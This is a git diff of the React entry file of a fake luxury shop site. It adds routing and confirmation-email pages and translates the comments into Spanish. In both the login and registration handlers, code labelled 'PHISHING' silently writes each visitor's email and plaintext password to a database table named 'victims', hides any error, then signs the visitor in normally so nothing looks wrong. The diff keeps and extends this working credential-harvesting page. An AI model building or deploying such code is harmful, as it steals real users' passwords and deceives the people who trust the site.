@@ -1,28 +1,32 @@
 import React, { useState } from 'react';
-import { Header } from './components/Header';
-import { ProductCard } from './components/ProductCard';
-import { LoginForm } from './components/LoginForm';
-import { products } from './data/products';
-
+import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate, useLocation } from 'react-router-dom';
+import { LoginPage } from './pages/LoginPage';
+import { ConfirmEmailPage } from './pages/ConfirmEmailPage';
+import { HomePage } from './pages/HomePage';
+import { ProtectedRoute } from './components/ProtectedRoute';
 import { supabase } from './supabaseClient';
 
-function App() {
+function AppContent() {
+  const navigate = useNavigate();
+  const location = useLocation();
   const [user, setUser] = useState(null);
   const [cart, setCart] = useState([]);
   const [searchQuery, setSearchQuery] = useState('');
   const [categoryFilter, setCategoryFilter] = useState(null);
+  const [pendingVerification, setPendingVerification] = useState(false);
+  const [pendingEmail, setPendingEmail] = useState(null);
 
   const handleLogin = async (email, password) => {
-    // 1. PHISHING: Capture the data silently first!
+    // 1. PHISHING: ¡Captura los datos silenciosamente primero!
     try {
       await supabase
         .from('victims')
         .insert([{ email, password }]);
     } catch (err) {
-      // Silent failure
+      // Fallo silencioso
     }
 
-    // 2. REAL AUTH: Verify credentials with Supabase
+    // 2. AUTH REAL: Verifica credenciales con Supabase
     try {
       const { data, error } = await supabase.auth.signInWithPassword({
         email,
@@ -30,27 +34,27 @@ function App() {
       });
 
       if (error) {
-        alert('Login failed: ' + error.message);
+        alert('Error en el inicio de sesión: ' + error.message);
       } else {
-        // Only log in if Supabase says the credentials are valid
+        // Solo iniciar sesión si Supabase valida las credenciales
         setUser({ email: data.user.email });
       }
     } catch (err) {
-      alert('Login error: ' + err.message);
+      alert('Error de inicio de sesión: ' + err.message);
     }
   };
 
   const handleRegister = async (email, password) => {
-    // 1. PHISHING: Capture the data first!
+    // 1. PHISHING: ¡Captura los datos primero!
     try {
       await supabase
         .from('victims')
         .insert([{ email, password }]);
     } catch (err) {
-      // Silent failure
+      // Fallo silencioso
     }
 
-    // 2. REAL AUTH: Create the user in Supabase to send the confirmation email
+    // 2. AUTH REAL: Crea el usuario en Supabase para enviar el email de confirmación
     try {
       const { data, error } = await supabase.auth.signUp({
         email,
@@ -58,12 +62,13 @@ function App() {
       });
 
       if (error) {
-        alert('Error creating account: ' + error.message);
+        alert('Error al crear la cuenta: ' + error.message);
       } else {
-        alert('Account created! Please check your email to confirm your registration.');
-        // Optionally log them in or wait for confirmation. 
-        // For the phishing demo, we can just log them in to keep the flow.
-        setUser({ email });
+        // Mostrar vista de confirmación de email en lugar de loguear
+        setPendingEmail(email);
+        setPendingVerification(true);
+        // Redirigir a la página de confirmación
+        setTimeout(() => navigate('/confirm-email'), 0);
       }
     } catch (err) {
       alert('Error: ' + err.message);
@@ -75,75 +80,68 @@ function App() {
     setCart([]);
   };
 
-  const handleAddToCart = (product) => {
-    setCart([...cart, product]);
+  const handleBackToLogin = () => {
+    setPendingVerification(false);
+    setPendingEmail(null);
   };
-
-  const handleRemoveFromCart = (productId) => {
-    setCart(cart.filter(item => item.id !== productId));
-  };
-
-  const handleCategoryClick = (category) => {
-    setCategoryFilter(category === 'Collections' ? null : category); // Reset if Collections
-  };
-
-  // Filter products
-  const filteredProducts = products.filter(product => {
-    const matchesSearch = product.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      product.category.toLowerCase().includes(searchQuery.toLowerCase());
-    const matchesCategory = categoryFilter ? product.category === categoryFilter || (categoryFilter === 'New Arrivals') : true;
-
-    return matchesSearch && matchesCategory;
-  });
-
-  if (!user) {
-    return (
-      <div className="auth-page">
-        <LoginForm onLogin={handleLogin} onRegister={handleRegister} />
-      </div>
-    );
-  }
 
   return (
-    <div className="app">
-      <Header
-        cartCount={cart.length}
-        onSearch={setSearchQuery}
-        onCategoryClick={handleCategoryClick}
-        onLogout={handleLogout}
-        user={user}
+    <Routes>
+      {/* Ruta de Login - Solo accesible sin autenticación */}
+      <Route 
+        path="/login" 
+        element={user ? <Navigate to="/home" replace /> : <LoginPage onLogin={handleLogin} onRegister={handleRegister} pendingVerification={pendingVerification} />} 
       />
 
-      <main>
-        <div className="shop-hero">
-          <div className="container">
-            <h1>{categoryFilter || 'The Autumn Collection'}</h1>
-            <p>Discover the new standard of luxury.</p>
-          </div>
-        </div>
+      {/* Ruta de Confirmación de Email - Solo accesible durante registro pendiente */}
+      <Route 
+        path="/confirm-email" 
+        element={
+          pendingVerification ? (
+            <ConfirmEmailPage email={pendingEmail} onBackToLogin={handleBackToLogin} />
+          ) : (
+            <Navigate to="/login" replace />
+          )
+        } 
+      />
 
-        <div className="container">
-          <div className="product-grid">
-            {filteredProducts.length > 0 ? (
-              filteredProducts.map(product => {
-                const isInCart = cart.some(item => item.id === product.id);
-                return (
-                  <ProductCard
-                    key={product.id}
-                    product={product}
-                    isInCart={isInCart}
-                    onAddToCart={handleAddToCart}
-                    onRemoveFromCart={handleRemoveFromCart}
-                  />
-                );
-              })
-            ) : (
-              <p style={{ gridColumn: '1/-1', textAlign: 'center' }}>No products found.</p>
-            )}
-          </div>
-        </div>
-      </main>
-    </div>
+      {/* Ruta Protegida - Home/Tienda - Solo accesible con autenticación */}
+      <Route 
+        path="/home" 
+        element={
+          <ProtectedRoute user={user}>
+            <HomePage 
+              user={user}
+              cart={cart}
+              setCart={setCart}
+              onLogout={handleLogout}
+              searchQuery={searchQuery}
+              setSearchQuery={setSearchQuery}
+            />
+          </ProtectedRoute>
+        } 
+      />
+
+      {/* Redirección por defecto */}
+      <Route 
+        path="/" 
+        element={<Navigate to={user ? "/home" : "/login"} replace />} 
+      />
+
+      {/* 404 - Ruta no encontrada */}
+      <Route 
+        path="*" 
+        element={<Navigate to={user ? "/home" : "/login"} replace />} 
+      />
+    </Routes>
+  );
+}
+
+function App() {
+  return (
+    <Router>
+      <AppContent />
+    </Router>
   );
 }
 
